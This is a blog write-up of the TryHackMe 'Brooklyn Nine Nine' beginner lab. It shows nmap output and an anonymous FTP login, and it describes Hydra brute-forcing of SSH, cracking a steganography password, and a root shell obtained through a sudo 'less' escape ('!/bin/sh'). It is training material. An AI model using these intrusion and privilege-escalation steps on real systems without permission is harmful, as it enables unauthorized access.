---
layout: post
title: Brookyln Nine Nine Writeup
categories: [TryHackMe]
tags: [Misconfigured FTP, Steganography, Bruteforce]
---
 
# Brooklyn Nine Nine 
This room is aimed for beginner level hackers but anyone can try to hack this box. There are two main intended ways to root the box. you can check it out here:
[Tryhackme](https://www.tryhackme.com/room/brooklynninenine)

# ~$ Preface::
First off I am personally a huge fan of the show, (Amy is my fav character btw I'm sure yunno why lol) and Its a quite easy one, but no worries if youre stuck I'll walk you through buddy;) but first I'll leave hints to stimulate your mind:
![image](https://github.com/Rami3ll/Rami3ll.github.io/blob/main/assets/img/posts/brooklyn99.jpg)

# ~$ Hints::
- checked source code yet??
- Port 80 exists for a reason yunno?
- Hmph, just a picture? 
- Bruteforcing steg?

First things first, a Portscan so we know our attack surface:

```
┌──(azazel㉿azazel)-[~/Tryhackme/Brooklyn99]
└─$ nmap -sC -sV 10.10.24.94 -Pn -vv -p 1-1024 -T4 --open  
21/tcp open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.45.27
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 16:7f:2f:fe:0f:ba:98:77:7d:6d:3e:b6:25:72:c6:a3 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDQjh/Ae6uYU+t7FWTpPoux5Pjv9zvlOLEMlU36hmSn4vD2pYTeHDbzv7ww75UaUzPtsC8kM1EPbMQn1BUCvTNkIxQ34zmw5FatZWNR8/De/u/9fXzHh4MFg74S3K3uQzZaY7XBaDgmU6W0KEmLtKQPcueUomeYkqpL78o5+NjrGO3HwqAH2ED1Zadm5YFEvA0STasLrs7i+qn1G9o4ZHhWi8SJXlIJ6f6O1ea/VqyRJZG1KgbxQFU+zYlIddXpub93zdyMEpwaSIP2P7UTwYR26WI2cqF5r4PQfjAMGkG1mMsOi6v7xCrq/5RlF9ZVJ9nwq349ngG/KTkHtcOJnvXz
|   256 2e:3b:61:59:4b:c4:29:b5:e8:58:39:6f:6f:e9:9b:ee (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBItJ0sW5hVmiYQ8U3mXta5DX2zOeGJ6WTop8FCSbN1UIeV/9jhAQIiVENAW41IfiBYNj8Bm+WcSDKLaE8PipqPI=
|   256 ab:16:2e:79:20:3c:9b:0a:01:9c:8c:44:26:01:58:04 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP2hV8Nm+RfR/f2KZ0Ub/OcSrqfY1g4qwsz16zhXIpqk
80/tcp open  http    syn-ack Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Apache/2.4.29 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
Perfect, port 21, 22 and 80, ftp, ssh and http all present, lets get to it then...

# ~$ First Intended method::
Got anon logins allowed on ftp, so, swiftly I log in to "get" the file we see from our script scan: "note_to_jake.txt" where Amy gives us a clear hint(See why I like her?)::

```
┌──(azazel㉿azazel)-[~/Tryhackme/Brooklyn99]
└─$ ftp 10.10.24.94
Connected to 10.10.24.94.
220 (vsFTPd 3.0.3)
Name (10.10.24.94:azazel): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0             119 May 17  2020 note_to_jake.txt
226 Directory send OK.
ftp> get note_to_jake.txt
local: note_to_jake.txt remote: note_to_jake.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for note_to_jake.txt (119 bytes).
226 Transfer complete.
119 bytes received in 0.00 secs (378.5372 kB/s)
```
I read the file and get the clue that Jake is using weak creds(Classic Jake), 
```
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```
hehee I let Hydra do his thing::
![image](https://github.com/Rami3ll/Rami3ll.github.io/blob/main/assets/img/posts/B991edit.png)

Welp, Jake was not the root user and the user.txt is also not his or in his home directory, I navigated to Holt's and found the user.txt flag,  
before scp or wget...ing any Privesc script I like to manually check for LPE vectors apparently we have sudo permissions to use "less". [gtfobins](https://gtfobins.github.io/) says we can use this for privesc like so::

![image](https://github.com/Rami3ll/Rami3ll.github.io/blob/main/assets/img/posts/b99Privesc.png)
next::
```
sudo less /etc/profile 
```
And append 
```
!/bin/sh
```
And thats it we are root! read the file, submit the flags.

Why this was fun is because it made me understand the relevance of the /etc/profile config file, it is basically a root owned folder that is ran on login of any user as a child process of systemd(like all processes are) that controls system-wide default variables especially terminal type in our case scenerio, us having priviledged access to the "less" command utility which provides a "vim or a vim-like interface" to read files and edit binaries, leveraging that allowed us carry out command operations within the file with the "less" binary allowing us spawn a root shell.



# ~$ Second Intended Method
Won't be posting images to display cause I forgot to document this part lol, but its pretty basic, I'll give the steps here ;
- Visited port 80 and checked source code which gave the clue:
 ```
 Have you ever head of steganography?
 ```
- Downloaded the image being served on port 80 through the server, Yes the seemingly unsuspecting image.
 Tried a 2 common passwords and failed swiftly and then decided to google-fu a little for tools to bruteforce a steg image and found two: stegcracker and stegseek, although stegseek is more revered due to speed I prefer stegcracker on multithread mode :)
 
- Then I used Stegcracker:
```
sudo apt install stegcracker
```
![image](https://github.com/Rami3ll/Rami3ll.github.io/blob/main/assets/img/posts/steg-bb9.png)

- cat the output file and it gives us this
``` 
Holts Password:
fl#################e

Enjoy!!
```
- It gives us Holts ssh creds, I log in, Holt has a different sudo permission used [gtfobins](https://gtfobins.github.io/) and got root!
And thats it!


Greetings, from [Rami3l](https://www.tryhackme.com/p/Rami3l).



